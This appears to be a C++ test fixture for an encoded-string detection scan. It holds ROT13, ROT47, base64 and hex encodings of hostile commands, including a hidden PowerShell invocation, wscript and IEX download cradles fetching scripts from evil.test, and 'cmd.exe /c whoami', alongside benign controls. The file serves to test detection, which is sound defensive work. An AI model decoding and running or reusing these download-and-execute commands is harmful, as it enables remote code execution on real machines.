// Fixture for the CyberChef encoded-string scan (include/net/cyberchef.hpp).
//
// Every interesting string is stored encoded, the way a sample hides it
// from a plain `strings` pass:
//   k_rot13_ps   - ROT13 of a PowerShell invocation
//   k_rot13_url  - ROT13 of a wscript dropper that fetches a remote script
//   k_rot47_ps   - ROT47 of the same PowerShell payload (punctuation cipher)
//   k_b64_evil   - base64 of an IEX / Net.WebClient download cradle
//   k_hex_cmd    - hex of a cmd.exe invocation
//
// The two controls must NOT be flagged and are the false-positive guards
// for the scan: k_plain_benign is ordinary prose, k_b64_benign decodes to
// ordinary prose (readable, but no indicator hit).
//
// Expected: 5 flagged entries - ROT13 x2, ROT47 x1, From Base64 x1,
// From Hex x1 - and 0 flags for the controls.

#include <cstdio>

static const char k_rot13_ps[]  = "cbjrefuryy -abc -j uvqqra -rap FDOSNStN";
static const char k_rot13_url[] = "jfpevcg.rkr //O //R:WFpevcg uggc://rivy.grfg/qebc.iof";
static const char k_rot47_ps[]  = "A@H6CD96== \\?@A \\H 9:556? \\6?4 $\"qupu8p";
static const char k_b64_evil[]  =
    "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw"
    "Oi8vZXZpbC50ZXN0L3BheWxvYWQucHMxJyk=";
static const char k_b64_benign[] =
    "VGhpcyBhcHBsaWNhdGlvbiBoYXMgZW5jb3VudGVyZWQgYSBydW50aW1lIGVycm9yIGFu"
    "ZCBtdXN0IGNsb3NlIG5vdw==";
static const char k_hex_cmd[]    = "636D642E657865202F632077686F616D69";
static const char k_plain_benign[] =
    "This application has encountered a runtime error and must close now";

int main(int argc, char** argv) {
  const char* samples[] = {
      k_rot13_ps,  k_rot13_url, k_rot47_ps,  k_b64_evil,
      k_b64_benign, k_hex_cmd,  k_plain_benign,
  };
  for (const char* s : samples) std::puts(s);
  std::printf("encoded_sample argc=%d\n", argc);
  (void)argv;
  return 0;
}
